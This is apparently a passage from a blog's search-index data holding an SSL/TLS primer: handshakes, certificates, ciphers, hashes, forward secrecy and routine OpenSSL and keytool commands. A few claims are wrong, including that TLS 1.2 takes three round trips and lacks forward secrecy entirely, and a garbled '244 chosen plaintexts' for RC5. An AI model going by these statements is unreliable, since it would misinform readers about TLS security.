contain a PreMasterSecret, public key, or nothing. (Again, this depends on the selected cipher.) This PreMasterSecret is encrypted using the public key of the server certificate. The client sends a CertificateVerify message, which is a signature over the previous handshake messages using the client's certificate's private key. This signature can be verified by using the client's certificate's public key. This lets the server know that the client has access to the private key of the certificate and thus owns the certificate. The client and server then use the random numbers and PreMasterSecret to compute a common secret, called the \"master secret\". All other key data for this connection is derived from this master secret (and the client- and server-generated random values), which is passed through a carefully designed pseudorandom function. The client now sends a ChangeCipherSpec record, essentially telling the server, \"Everything I tell you from now on will be authenticated (and encrypted if encryption was negotiated). \" The ChangeCipherSpec is itself a record-level protocol and has type 20 and not 22. Finally, the client sends an encrypted Finished message, containing a hash and MAC over the previous handshake messages. The server will attempt to decrypt the client's Finished message and verify the hash and MAC. If the decryption or verification fails, the handshake is considered to have failed and the connection should be torn down. Finally, the server sends a ChangeCipherSpec, telling the client, \"Everything I tell you from now on will be authenticated (and encrypted if encryption was negotiated). \" The server sends its own encrypted Finished message. The client performs the same decryption and verification procedure as the server did in the previous step. Application phase At this point in the process the \"handshake\" is complete and the application protocol is enabled, with content type of 23. Application messages exchanged between client and server will also be encrypted exactly like in their Finished message. The TLS 1.3 Handshake The TLS 1.3 handshake process involves only one round-trip as opposed to three in TLS 1.2. This results in reduced latency. Similar to the TLS 1.2 handshake, the TLS 1.3 handshake commences with the \u201cClient Hello\u201d message \u2013 with one significant change. The client sends the list of supported cypher suites and guesses which key agreement protocol the server is likely to select. The client also sends its key share for that particular key agreement protocol. In reply to the \u201cClient Hello\u201d message, the server replies with the key agreement protocol that it has chosen. The \u201cServer Hello\u201d message also comprises of the server\u2019s key share, its certificate as well as the \u201cServer Finished\u201d message. The \u201cServer Finished\u201d message, which was sent in the 6th step in TLS 1.2 handshake, is sent in the second step. Thereby, saving four steps and one round trip along the way. Now, the client checks the server certificate, generates keys as it has the key share of the server, and sends the \u201cClient Finished\u201d message. From here on, the encryption of the data begins. This way, the TLS 1.3 handshake saves an entire round-trip and hundreds of milliseconds. A major improvement over the TLS 1.2 handshake. 0-RTT Resumption: The Good Another major milestone that TLS 1.3 is set to accomplish is 0-RTT Resumption. It means that if the client has connected to the server before, TLS 1.3 permits a zero-round trip handshake. This is accomplished by storing secret information (typically, Session ID or Session Tickets) of previous sessions and using them when both parties connect with each other in future. 0-RTT Resumption: The Bad However, there are few concerns when it comes to the security in 0-RTT resumption sessions. The first being the lack of full forward secrecy. It means that if these session ticket keys are compromised, an attacker can decrypt the 0-RTT data sent by the client on the first flight. Of course, this can easily be avoided by rotating session keys regularly. But considering TLS 1.2 doesn\u2019t support full forward secrecy at all, TLS 1.3 is definitely an improvement. The second security concern when it comes to TLS 1.3 0-RTT is that it doesn\u2019t provide a guarantee of non-replay between connections. If an attacker somehow manages to get hold of your 0-RTT encrypted data, it can fool the server into believing that the request came from the server since it has no way of knowing where the data came from. If an attacker sends this request multiple times, it\u2019s called \u2018replay attack.\u2019 It\u2019s not as easy as it sounds and obviously, there are certain mechanisms to prevent that. Common Filetypes There are several commonly used filename extensions for X.509 certificates. Unfortunately, some of these extensions are also used for other data such as private keys. .pem \u2013 (Privacy-enhanced Electronic Mail) Base64 encoded DER certificate, enclosed between \"-----BEGIN CERTIFICATE-----\" and \"-----END CERTIFICATE-----\" .cer, .crt, .der \u2013 usually in binary DER form, but Base64-encoded certificates are common too (see .pem above) .p7b, .p7c \u2013 PKCS#7 Signed Data structure without data, just certificate(s) or CRL(s) .p12 \u2013 PKCS#12, may contain certificate(s) (public) and private keys (password protected) .pfx \u2013 PFX, predecessor of PKCS#12 (usually contains data in PKCS#12 format, e.g., with PFX files generated in IIS) .jks - Java KeyStore is a repository of security certificates \u2013 either authorization certificates or public key certificates \u2013 plus corresponding private keys, used for instance in SSL encryption. In IBM WebSphere Application Server and Oracle WebLogic Server, a file with extension jks serves as a keystore. The Java Development Kit maintains a CA keystore file named cacerts in folder jre/lib/security. JDKs provide a tool named keytool to manipulate the keystore. keytool has no functionality to extract the private key out of the keystore, but this is possible with third-party tools like jksExportKey, CERTivity, Portecle and KeyStore Explorer. Certificate Authorities In cryptography, a certificate authority or certification authority (CA) is an entity that issues digital certificates. A digital certificate certifies the ownership of a public key by the named subject of the certificate. This allows others (relying parties) to rely upon signatures or on assertions made about the private key that corresponds to the certified public key. A CA acts as a trusted third party\u2014trusted both by the subject (owner) of the certificate and by the party relying upon the certificate. The format of these certificates is specified by the X.509 or EMV standard. A CA issues digital certificates that contain a public key and the identity of the owner. The matching private key is not made available publicly, but kept secret by the end user who generated the key pair. The certificate is also a confirmation or validation by the CA that the public key contained in the certificate belongs to the person, organization, server or other entity noted in the certificate. A CA's obligation in such schemes is to verify an applicant's credentials, so that users and relying parties can trust the information in the CA's certificates. CAs use a variety of standards and tests to do so. In essence, the certificate authority is responsible for saying \"yes, this person is who they say they are, and we, the CA, certify that\". If the user trusts the CA and can verify the CA's signature, then they can also assume that a certain public key does indeed belong to whoever is identified in the certificate. Chains of Trust A chain of trust is designed to allow multiple users to create and use software on the system, which would be more difficult if all the keys were stored directly in hardware. It starts with hardware that will only boot from software that is digitally signed. The signing authority will only sign boot programs that enforce security, such as only running programs that are themselves signed, or only allowing signed code to have access to certain features of the machine. This process may continue for several layers. This process results in a chain of trust. The final software can be trusted to have certain properties, because if it had been illegally modified its signature would be invalid, and the previous software would not have executed it. The previous software can be trusted, because it, in turn, would not have been loaded if its signature had been invalid. The trustworthiness of each layer is guaranteed by the one before, back to the trust anchor. It would be possible to have the hardware check the suitability (signature) for every single piece of software. However, this would not produce the flexibility that a \"chain\" provides. In a chain, any given link can be replaced with a different version to provide different properties, without having to go all the way back to the trust anchor. This use of multiple layers is an application of a general technique to improve scalability, and is analogous to the use of multiple certificates in a certificate chain. Encryption Schemas Encryption Schemas can be broken down into 2 main categories block ciphers and steam ciphers Block ciphers A block cipher is a deterministic algorithm operating on fixed-length groups of bits, called blocks. It uses an unvarying transformation, that is, it uses a symmetric key. They are specified elementary components in the design of many cryptographic protocols and are widely used to implement the encryption of large amounts of data, including data exchange protocols. Even a secure block cipher is suitable only for the encryption of a single block of data at a time, using a fixed key. A multitude of modes of operation have been designed to allow their repeated use in a secure way, to achieve the security goals of confidentiality and authenticity. However, block ciphers may also feature as building blocks in other cryptographic protocols, such as universal hash functions and pseudo-random number generators. Notable Block Ciphers Lucifer / DES Lucifer is generally considered to be the first civilian block cipher, developed at IBM in the 1970s based on work done by Horst Feistel. A revised version of the algorithm was adopted as a U.S. government Federal Information Processing Standard: FIPS PUB 46 Data Encryption Standard (DES). It was chosen by the U.S. National Bureau of Standards (NBS) after a public invitation for submissions and some internal changes by NBS (and, potentially, the NSA). DES was publicly released in 1976 and has been widely used. DES was designed to, among other things, resist a certain cryptanalytic attack known to the NSA and rediscovered by IBM, though unknown publicly until rediscovered again and published by Eli Biham and Adi Shamir in the late 1980s. The technique is called differential cryptanalysis and remains one of the few general attacks against block ciphers; linear cryptanalysis is another, but may have been unknown even to the NSA, prior to its publication by Mitsuru Matsui. DES prompted a large amount of other work and publications in cryptography and cryptanalysis in the open community and it inspired many new cipher designs. DES has a block size of 64 bits and a key size of 56 bits. 64-bit blocks became common in block cipher designs after DES. Key length depended on several factors, including government regulation. Many observers in the 1970s commented that the 56-bit key length used for DES was too short. As time went on, its inadequacy became apparent, especially after a special purpose machine designed to break DES was demonstrated in 1998 by the Electronic Frontier Foundation. An extension to DES, Triple DES, triple-encrypts each block with either two independent keys (112-bit key and 80-bit security) or three independent keys(168-bit key and 112-bit security). It was widely adopted as a replacement. As of 2011, the three-key version is still considered secure, though the National Institute of Standards and Technology (NIST) standards no longer permit the use of the two-key version in new applications, due to its 80-bit security level. As of https://tools.ietf.org/html/rfc8996 the Single DES block cipher is deprecated and should not be used. 3DES or Triple DES are still allowed as of this RFC. IDEA The International Data Encryption Algorithm (IDEA) is a block cipher designed by James Massey of ETH Zurich and Xuejia Lai; it was first described in 1991, as an intended replacement for DES. IDEA operates on 64-bit blocks using a 128-bit key, and consists of a series of eight identical transformations (a round) and an output transformation (the half-round). The processes for encryption and decryption are similar. IDEA derives much of its security by interleaving operations from different groups \u2013 modular addition and multiplication, and bitwise exclusive or (XOR) \u2013 which are algebraically \"incompatible\" in some sense. The designers analyzed IDEA to measure its strength against differential cryptanalysis and concluded that it is immune under certain assumptions. No successful linear or algebraic weaknesses have been reported. As of 2012, the best attack which applies to all keys can break full 8.5-round IDEA using a narrow-bicliques attack about four times faster than brute force. As of https://tools.ietf.org/html/rfc8996 the IDEA block cipher is deprecated and should not be used RC5 RC5 is a block cipher designed by Ronald Rivest in 1994 which, unlike many other ciphers, has a variable block size (32, 64 or 128 bits), key size (0 to 2040 bits) and number of rounds (0 to 255). The original suggested choice of parameters were a block size of 64 bits, a 128-bit key and 12 rounds. A key feature of RC5 is the use of data-dependent rotations; one of the goals of RC5 was to prompt the study and evaluation of such operations as a cryptographic primitive. RC5 also consists of a number of modular additions and XORs. The general structure of the algorithm is a Feistel-like network. The encryption and decryption routines can be specified in a few lines of code. The key schedule, however, is more complex, expanding the key using an essentially one-way function with the binary expansions of both e and the golden ratio as sources of \"nothing up my sleeve numbers\". The tantalizing simplicity of the algorithm together with the novelty of the data-dependent rotations has made RC5 an attractive object of study for cryptanalysts.12-round RC5 (with 64-bit blocks) is susceptible to a differential attack using 244 chosen plaintexts. 18\u201320 rounds are suggested as sufficient protection. Rijndael / AES The Rijndael cipher developed by Belgian cryptographers, Joan Daemen and Vincent Rijmen was one of the competing designs to replace DES. It won the 5-year public competition to become the AES, (Advanced Encryption Standard). Adopted by NIST in 2001, AES has a fixed block size of 128 bits and a key size of 128, 192, or 256 bits, whereas Rijndael can be specified with block and key sizes in any multiple of 32 bits, with a minimum of 128 bits. The blocksize has a maximum of 256 bits, but the keysize has no theoretical maximum. AES operates on a 4\u00d74 column-major order matrix of bytes, termed the state (versions of Rijndael with a larger block size have additional columns in the state). Blowfish Blowfish is a block cipher, designed in 1993 by Bruce Schneier and included in a large number of cipher suites and encryption products. Blowfish has a 64-bit block size and a variable key length from 1 bit up to 448 bits. It is a 16-round Feistel cipher and uses large key-dependent Sboxes. Notable features of the design include the key-dependent S-boxes and a highly complex key schedule. It was designed as a general-purpose algorithm, intended as an alternative to the ageing DES and free of the problems and constraints associated with other algorithms. At the time Blowfish was released, many other designs were proprietary, encumbered by patents or were commercial/government secrets. Schneier has stated that, \"Blowfish is unpatented, and will remain so in all countries. The algorithm is hereby placed in the public domain, and can be freely used by anyone.\" The same applies to Twofish, a successor algorithm from Schneier. Stream ciphers A stream cipher is a symmetric key cipher where plaintext digits are combined with a pseudorandom cipher digit stream (keystream). In a stream cipher, each plaintext digit is encrypted one at a time with the corresponding digit of the keystream, to give a digit of the ciphertext stream. Since encryption of each digit is dependent on the current state of the cipher, it is also known as state cipher. In practice, a digit is typically a bit and the combining operation is an exclusive-or (XOR). The pseudorandom keystream is typically generated serially from a random seed value using digital shift registers. The seed value serves as the cryptographic key for decrypting the ciphertext stream. Stream ciphers represent a different approach to symmetric encryption from block ciphers. Block ciphers operate on large blocks of digits with a fixed, unvarying transformation. This distinction is not always clear-cut: in some modes of operation, a blockcipher primitive is used in such a way that it acts effectively as a stream cipher. Stream ciphers typically execute at a higher speed than block ciphers and have lower hardware complexity. However, stream ciphers can be susceptible to serious security problems if used incorrectly (see stream cipher attacks); in particular, the same starting state (seed) must never be used twice. Stream ciphers are often used for their speed and simplicity of implementation in hardware, and in applications where plaintext comes in quantities of unknowable length like a secure wireless connection. If a block cipher (not operating in a stream cipher mode) were to be used in this type of application, the designer would need to choose either transmission efficiency or implementation complexity, since block ciphers cannot directly work on blocks shorter than their block size. For example, if a 128-bit block cipher received separate 32-bit bursts of plaintext, three quarters of the data transmitted would be padding. Block ciphers must be used in ciphertext stealing or residual block termination mode to avoid padding, while stream ciphers eliminate this issue by naturally operating on the smallest unit that can be transmitted (usually bytes). Another advantage of stream ciphers in military cryptography is that the cipher stream can be generated in a separate box that is subject to strict security measures and fed to other devices such as a radio set, which will perform the xor operation as part of their function. The latter device can then be designed and used in less stringent environments. ChaCha is becoming the most widely used stream cipher in software; others include: RC4, A5/1, A5/2, Chameleon, FISH, Helix, ISAAC, MUGI, Panama, Phelix, Pike, Salsa20, SEAL, SOBER, SOBER-128, and WAKE. Hashing Functions There are many cryptographic hash algorithms; this section lists a few algorithms that are referenced relatively often. A more extensive list can be found on the page containing a comparison of cryptographic hash functions. MD5 MD5 was designed by Ronald Rivest in 1991 to replace an earlier hash function MD4, and was specified in 1992 as https://www.ietf.org/rfc/rfc1321.txt . Collisions against MD5 can be calculated within seconds which makes the algorithm unsuitable for most use cases where a cryptographic hash is required. MD5 produces a digest of 128 bits (16 bytes). SHA-1 SHA-1 was developed as part of the U.S. Government's Capstone project. The original specification \u2013 now commonly called SHA-0 \u2013 of the algorithm was published in 1993 under the title Secure Hash Standard, FIPS PUB 180, by U.S. government standards agency NIST (National Institute of Standards and Technology). It was withdrawn by the NSA shortly after publication and was superseded by the revised version, published in 1995 in FIPS PUB 180-1 and commonly designated SHA-1. Collisions against the full SHA-1 algorithm can be produced using the shattered attack and the hash function should be considered broken. SHA-1 produces a hash digest of 160 bits (20 bytes). Documents may refer to SHA-1 as just \"SHA\", even though this may conflict with the other Standard Hash Algorithms such as SHA-0, SHA-2 and SHA-3. RIPEMD-160 RIPEMD (RACE Integrity Primitives Evaluation Message Digest) is a family of cryptographic hash functions developed in Leuven, Belgium, by Hans Dobbertin, Antoon Bosselaers and Bart Preneel at the COSIC research group at the Katholieke Universiteit Leuven, and first published in 1996. RIPEMD was based upon the design principles used in MD4, and is similar in performance to the more popular SHA-1. RIPEMD-160 has however not been broken. As the name implies, RIPEMD-160 produces a hash digest of 160 bits (20 bytes). Whirlpool Whirlpool is a cryptographic hash function designed by Vincent Rijmen and Paulo S. L. M. Barreto, who first described it in 2000. Whirlpool is based on a substantially modified version of the Advanced Encryption Standard (AES). Whirlpool produces a hash digest of 512 bits (64 bytes). SHA-2 SHA-2 (Secure Hash Algorithm 2) is a set of cryptographic hash functions designed by the United States National Security Agency (NSA), first published in 2001. They are built using the Merkle\u2013Damg\u00e5rd structure, from a one-way compression function itself built using the Davies\u2013 Meyer structure from a (classified) specialized block cipher. SHA-2 basically consists of two hash algorithms: SHA-256 and SHA-512. SHA-224 is a variant of SHA-256 with different starting values and truncated output. SHA-384 and the lesser known SHA-512/224 and SHA-512/256 are all variants of SHA-512. SHA-512 is more secure than SHA-256 and is commonly faster than SHA-256 on 64 bit machines such as AMD64. The output size in bits is given by the extension to the \"SHA\" name, so SHA-224 has an output size of 224 bits (28 bytes), SHA-256 produces 32 bytes, SHA-384 produces 48 bytes and finally SHA-512 produces 64 bytes. SHA-3 SHA-3 (Secure Hash Algorithm 3) was released by NIST on August 5, 2015. SHA-3 is a subset of the broader cryptographic primitive family Keccak. The Keccak algorithm is the work of Guido Bertoni, Joan Daemen, Michael Peeters, and Gilles Van Assche. Keccak is based on a sponge construction which can also be used to build other cryptographic primitives such as a stream cipher. SHA-3 provides the same output sizes as SHA-2: 224, 256, 384 and 512 bits. Configurable output sizes can also be obtained using the SHAKE-128 and SHAKE-256 functions. Here the -128 and -256 extensions to the name imply the security strength of the function rather than the output size in bits. BLAKE2 An improved version of BLAKE called BLAKE2 was announced on December 21, 2012. It was created by Jean-Philippe Aumasson, Samuel Neves, Zooko Wilcox-O'Hearn, and Christian Winnerlein with the goal of replacing the widely used but broken MD5 and SHA-1 algorithms. When run on 64-bit x64 and ARM architectures, BLAKE2b is faster than SHA-3, SHA-2, SHA- 1, and MD5. Although BLAKE and BLAKE2 have not been standardized as SHA-3 has, BLAKE2 has been used in many protocols including the Argon2 password hash, for the high efficiency that it offers on modern CPUs. As BLAKE was a candidate for SHA-3, BLAKE and BLAKE2 both offer the same output sizes as SHA-3 \u2013 including a configurable output size. BLAKE3 BLAKE3, an improved version of BLAKE2, was announced on January 9, 2020. It was created by Jack O'Connor, Jean-Philippe Aumasson, Samuel Neves, and Zooko Wilcox-O'Hearn. BLAKE3 is a single algorithm, in contrast to BLAKE and BLAKE2, which are algorithm families with multiple variants. The BLAKE3 compression function is closely based on that of BLAKE2s, with the biggest difference being that the number of rounds is reduced from 10 to 7. Internally, BLAKE3 is a Merkle tree, and it supports higher degrees of parallelism than BLAKE2. Forward Secrecy Forward Secrecy (FS), also known as Perfect Forward Secrecy (PFS), is a feature of specific key agreement protocols that gives assurances that session keys will not be compromised even if long-term secrets used in the session key exchange are compromised. For HTTPS the long-term secret is typically the private signing key of the server. Forward secrecy protects past sessions against future compromises of keys or passwords. By generating a unique session key for every session a user initiates, the compromise of a single session key will not affect any data other than that exchanged in the specific session protected by that particular key. This by itself is not sufficient for forward secrecy which additionally requires that a long-term secret compromise does not affect the security of past session keys. Forward secrecy protects data on the transport layer of a network that uses common SSL/TLS protocols, including OpenSSL, when its long-term secret keys are compromised, as with the Heartbleed security bug. If forward secrecy is used, encrypted communications and sessions recorded in the past cannot be retrieved and decrypted should long-term secret keys or passwords be compromised in the future, even if the adversary actively interfered, for example via a man-in-the-middle attack. The value of forward secrecy is that it protects past communication. This reduces the motivation for attackers to compromise keys. For instance, if an attacker learns a long-term key, but the compromise is detected and the long-term key is revoked and updated, relatively little information is leaked in a forward secure system. The value of forward secrecy depends on the assumed capabilities of an adversary. Forward secrecy has value if an adversary is assumed to be able to obtain secret keys from a device (read access) but is either detected or unable to modify the way session keys are generated in the device (full compromise). In some cases an adversary who can read long-term keys from a device may also be able to modify the functioning of the session key generator, as in the backdoored Dual Elliptic Curve Deterministic Random Bit Generator. Forward security offers no protection once such a compromise occurred. Common Tools OpenSSL OpenSSL is a software library for applications that secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites. OpenSSL contains an open-source implementation of the SSL and TLS protocols. The core library, written in the C programming language, implements basic cryptographic functions and provides various utility functions. Wrappers allowing the use of the OpenSSL library in a variety of computer languages are available. The OpenSSL Software Foundation (OSF) represents the OpenSSL project in most legal capacities including contributor license agreements, managing donations, and so on. OpenSSL Software Services (OSS) also represents the OpenSSL project, for Support Contracts. OpenSSL is available for most Unix-like operating systems (including Linux, macOS, and BSD) and Microsoft Windows. OpenSSL supports a number of different cryptographic algorithms: Ciphers AES, Blowfish, Camellia, Chacha20, Poly1305, SEED, CAST-128, DES, IDEA, RC2, RC4, RC5, Triple DES, GOST 28147-89, SM4 Cryptographic hash functions MD5, MD4, MD2, SHA-1, SHA-2, SHA-3, RIPEMD-160, MDC-2, GOST R 34.11-94, BLAKE2, Whirlpool, SM3 Public-key cryptography RSA, DSA, Diffie\u2013Hellman key exchange, Elliptic curve, X25519, Ed25519, X448, Ed448, GOST R 34.10-2001, SM2(Perfect forward secrecy is supported using elliptic curve Diffie\u2013Hellman since version 1.0.) As of December 2012, OpenSSL is one of two open source programs involved in validation under the FIPS 140-2 computer security standard by the National Institute of Standards and Technology's (NIST) Cryptographic Module Validation Program (CMVP). (OpenSSL itself is not validated, but a component called the OpenSSL FIPS Object Module, based on OpenSSL, was created to provide many of the same capabilities). A certificate was first awarded in January 2006 but revoked in July 2006 \"when questions were raised about the validated module's interaction with outside software.\" The certification was reinstated in February 2007. Command examples The following are some OpenSSL command examples you can use to help troubleshoot your certificate implementations This command will attempt to open an SSL/TLS tunnel from the node that runs it to nodename.mydomain.com on port 443. In a successful state you should see any SSL/TLS Cert applied to nodename.mydomain.com:443 to be presented in your terminal. In a failure state you should see an error displayed. openssl s_client -connect google.com:443 View full X.509 data for a certificate openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -text Convert a DER file (.crt .cer .der) to PEM openssl x509 -inform der -in certificate.cer -out certificate.pem Convert a PEM file to DER openssl x509 -in certificate.pem -out certificate.der -outform der Convert a PKCS#12 file ( .pfx .p12 ) containing a private key and certificates to PEM openssl pkcs12 -in keyStore.pfx -out keyStore.pem -nodes Encrypt a sting with the password \"Password\" echo \"Super secret squrrels\" | openssl enc -aes-256-cbc -a -e -pass pass:Password -pbkdf2 Decrypt a string with the password \"Password\" echo \"U2FsdGVkX1//raN1Fube79JCWsXlRbzrla7W1BRJuicrdMZEOFHiNCL1K9Pfm3XY\" | openssl enc -aes-256-cbc -a -d -pass pass:Password -pbkdf2 Check an MD5 hash of the public key to ensure that it matches with what is in a CSR or private key openssl x509 -noout -modulus -in certificate.crt | openssl md5 openssl rsa -noout -modulus -in privateKey.key | openssl md5 openssl req -noout -modulus -in CSR.csr | openssl md5 Generate a new private key and Certificate Signing Request openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout privateKey.key Generate a self-signed certificate openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout privateKey.key -out certificate.crt Generate a certificate signing request (CSR) for an existing private key openssl req -out certificate.csr -key privateKey.key -new Generate a certificate signing request based on an existing certificate openssl x509 -x509toreq -in certificate.crt -out CSR.csr -signkey privateKey.key Remove a passphrase from a private key openssl rsa -in privateKey.pem -out newPrivateKey.pem Keytool The keytool command is a key and certificate management utility. It enables users to administer their own public/private key pairs and associated certificates for use in self-authentication (where a user authenticates themselves to other users and services) or data integrity and authentication services, by using digital signatures. The keytool command also enables users to cache the public keys (in the form of certificates) of their communicating peers. A certificate is a digitally signed statement from one entity (person, company, and so on), which says that the public key (and some other information) of some other entity has a particular value. When data is digitally signed, the signature can be verified to check the data integrity and authenticity. Integrity means that the data hasn't been modified or tampered with, and authenticity means that the data comes from the individual who claims to have created and signed it. The keytool command also enables users to administer secret keys and passphrases used in symmetric encryption and decryption (Data Encryption Standard). It can also display other security-related information. The keytool command stores the keys and certificates in a keystore. While keytool is invaluable in manipulating JKS Keystores it should be noted that while the JKS format is easy to implement in a Java program it is both a proprietary format and depreciated by Oracle. If given the option adopting the X.509 Standard in its place is the best practice. Command examples Generate a Java keystore and key pair keytool -genkey -alias mydomain -keyalg RSA -keystore keystore.jks -keysize 2048 Generate a certificate signing request (CSR) for an existing Java keystore keytool -certreq -alias mydomain -keystore keystore.jks -file mydomain.csr Import a root or intermediate CA certificate to an existing Java keystore keytool -import -trustcacerts -alias root -file Thawte.crt -keystore keystore.jks Import a signed primary certificate to an existing Java keystore keytool -import -trustcacerts -alias mydomain -file mydomain.crt -keystore keystore.jks Generate a keystore and self-signed certificate keytool -genkey -keyalg RSA -alias selfsigned -keystore keystore.jks -storepass password -validity 360 -keysize 2048 Check a stand-alone certificate keytool -printcert -v -file mydomain.crt Check which certificates are in a Java keystore keytool -list -v -keystore keystore.jks Check a particular keystore entry using an alias keytool -list -v -keystore keystore.jks -alias mydomain Delete a certificate from a Java Keytool keystore keytool -delete -alias mydomain -keystore keystore.jks Change a Java keystore password keytool -storepasswd -new new_storepass -keystore keystore.jks Export a certificate from a keystore keytool -export -alias mydomain -file mydomain.crt -keystore keystore.jks List Trusted CA Certs keytool -list -v -keystore $JAVA_HOME/jre/lib/security/cacerts Import New CA into Trusted Certs keytool -import -trustcacerts -file /path/to/ca/ca.pem -alias CA_ALIAS -keystore $JAVA_HOME/jre/lib/ Implementing SSL/TLS on your solution A method for adoption Phase 1 Each application that will be adopting SSL/TLS will need to have 3 local ports defined for it. A port for unencrypted traffic so that other solutions calling it don't break during the implementation steps A port for encrypted traffic for a Basic SSL/TLS Handshake that does not require Mutual Authentication A port for encrypted traffic for a Mutual Authentication SSL/TLS Handshake Additionally work needed to be scoped to ensure that the application to be encrypted can be supported and any necessary code changes can start to be developed. Now its time to request some certificates. In an ideal situation each node in the environment would have its own personal certificate however once your environments begin to grow you may find that approach unwieldy as each certificate would have to be managed independently and can be a nightmare to implement when scaled. This can be worked around with liberal application of the Subject Alternate Name (SAN) field in the X.509 Standard. By leveraging this an entire stack of nodes can share the same certificate across common nodes without having the drawback of managing a huge amount of certificates. The Catch-22 of this strategy is that in the event that this certificate either expires or becomes compromised a redeployment of a different certificate with the same properties would have to be implemented to restore system functionality across each node this certificate is signed for. An example of this follows. Use the strategy that works best for your solution. Given a 3 node stack (example1.mydomain.com(10.0.0.1), example2.mydomain.com(10.0.0.2), example3.mydomain.com(10.0.0.3)) a certificate that would be valid for these nodes would contain the following SAN data DNS: example1.mydomain.com DNS: example1 IP: 10.0.0.1 DNS: example2.mydomain.com DNS: example2 IP: 10.0.0.2 DNS: example3.mydomain.com DNS: example3 IP: 10.0.0.3 Note that each DNS record and IP are recorded as separate entity's in the SAN field also note that there is a distinction between between fully qualified domain names (FQDN) and short names for each node in the stack and they all need to be explicitly defined Keystores, Truststores and how to play nice with multiple environments Keystores are certificate bundles that are encrypted and contain the private key and certificate chain your application will be using to encrypt its traffic for the purposes of SSL. Being encrypted they will require a password that your application must pass to it to leverage the key stored within. These passwords are sensitive and should be treated the same as any other password do not leave them in unencrypted formats on code repositories or config files. Truststores are certificate bundles that may or may not be encrypted that contain public keys of certificate authorities your application can trust this will most likely contain the public keys for your companies Certificate Authorities as well as the CA's for any third party your application may be connecting to outside of your company. Generic CA Bundles are certificate bundles for common External Certificate Authorities (Digicert, Entrust, etc.) like the Truststores but come prepackaged within the installation of Operating Systems or application frameworks like Java. These are generally safe to trust and change with updated packages or standard patching processes. Note that any modifications you make to Generic CA bundles will not persist as these packages are upgraded in the future and modifying them while possible is not considered best practice. Phase 2 Now that you have your newly modified code, Keystores and Truststores you can now move forward with implementing your Basic SSL configuration as defined in Phase 1. Once its been implemented your clients can then begin to adopt the Basic SSL configuration in their applications. Note that any client reaching out to this stack on the Basic SSL port will need to trust the certificate authorities that signed the certificate your using. As an example if you signed your certificate using the company CA they would need to trust that CA before they would be able to make a successful connection. Phase 3 Once Basic SSL has been adopted in Phase 2 the Mutual Authentication option can be implemented. In addition to the steps listed in Phase 2 your client will also need to implement a certificate on their side that is trusted by your system. In this case the CA they used to sign would need to be added to your Truststore if it doesn't already exist. Once implemented your client can then modify their config and adopt SSL/TLS Mutual Authentication. Note the configuration you implemented in Phase 2 may be different from Phase 3 consult your technologies manual pages for more information. Phase 4 This phase is optional based on your solution and plans. Once Phase 3 has been adopted widely and you have moved all of your clients to at least Phase 2 you can begin having discussions around shutting down your unencrypted port and making plans to implement that. How do I install an SSL/TLS Certificate on Technology X? Unfortunately there is no straight answer to that question. The best advice I can give you is to review your applications specific manual pages to determine how to implement SSL/TLS on that platform as each technology is different. You can start by checking out the below links for various Domain Name Providers that may give you clues as to where to look in your specific technology. If after reviewing your manuals, documentation and links and no such information can be found hope is not lost you may still be able to implement SSL/TLS by way of a wrapper program such as stunnel which I have included the manual page to below. https://www.thesslstore.com/knowledgebase/ssl-install/ https://www.digicert.com/kb/ssl-certificate-installation.htm https://www.godaddy.com/help/install-ssl-certificates-16623 https://www.namecheap.com/support/knowledgebase/article.aspx/795/69/how-to-install-sslcertificates https://www.entrust.com/knowledgebase/ssl/how-to-generate-ecc-certificate-signingrequest-using-microsoft-management-console-mmc-on-microsoft-windows-2012 https://linux.die.net/man/8/stunnel More Info Transport Layer Security - https://en.wikipedia.org/wiki/Transport_Layer_Security SSL 3.0 RFC - https://tools.ietf.org/html/rfc6101 TLS 1.0 RFC - https://tools.ietf.org/html/rfc2246 TLS 1.1 RFC - https://tools.ietf.org/html/rfc4346 TLS 1.2 RFC - https://tools.ietf.org/html/rfc5246 TLS 1.3 RFC - https://tools.ietf.org/html/rfc8446 TLS 1.0 & 1.1 Deprication RFC - https://tools.ietf.org/html/rfc8996 X.509 Format - https://en.wikipedia.org/wiki/X.509 Java Keystore - https://en.wikipedia.org/wiki/Java_KeyStore Java Keystore Java Doc - https://docs.oracle.com/javase/8/docs/api/java/security/KeyStore.html Certificate Authority - https://en.wikipedia.org/wiki/Certificate_authority Chains of Trust - https://en.wikipedia.org/wiki/Chain_of_trust Block Ciphers - https://en.wikipedia.org/wiki/Block_cipherStream Ciphers - https://en.wikipedia.org/wiki/Stream_cipher Hash Functions - https://en.wikipedia.org/wiki/Cryptographic_hash_function Forward Secrecy - https://en.wikipedia.org/wiki/Forward_secrecy OpenSSL - https://en.wikipedia.org/wiki/OpenSSL OpenSSL Man Page - https://linux.die.net/man/1/openssl Keytool - https://docs.oracle.com/javase/8/docs/technotes/tools/unix/keytool.html Keytool Man Page - https://docs.oracle.com/en/java/javase/13/docs/specs/man/keytool.html","title":"An SSL/TLS primer for Application Development and Troubleshooting"},{"location":"Blog/2021-08-26-An-SSL-Primer/#what-is-ssltls","text":"Transport Layer Security (TLS), and its now-deprecated predecessor, Secure Sockets Layer (SSL), are cryptographic protocols designed to provide communications security over a computer network. Several versions of the protocols find widespread use in applications such as web browsing, email, instant messaging, and voice over IP (VoIP). Websites can use TLS to secure all communications between their servers and web browsers. The TLS protocol aims primarily to provide privacy and data integrity between two or more communicating computer applications. When secured by TLS, connections between a client (e.g., a web browser) and a server (e.g., wikipedia.org) should have one or more of the following properties: The connection is private (or secure) because symmetric cryptography is used to encrypt the data transmitted. The keys for this symmetric encryption are generated uniquely for each connection and are based on a shared secret that was negotiated at the start of the session. The server and client negotiate the details of which encryption algorithm and cryptographic keys to use before the first byte of data is transmitted. The negotiation of a shared secret is both secure (the negotiated secret is unavailable to eavesdroppers and cannot be obtained, even by an attacker who places themselves in the middle of the connection) and reliable (no attacker can modify the communications during the negotiation without being detected). The identity of the communicating parties can be authenticated using public-key cryptography. This authentication can be made optional, but is generally required for at least one of the parties (typically the server). The connection is reliable because each message transmitted includes a message integrity check using a message authentication code to prevent undetected loss or alteration of the data during transmission. In addition to the properties above, careful configuration of TLS can provide additional privacy related properties such as forward secrecy, ensuring that any future disclosure of encryption keys cannot be used to decrypt any TLS communications recorded in the past.","title":"What is 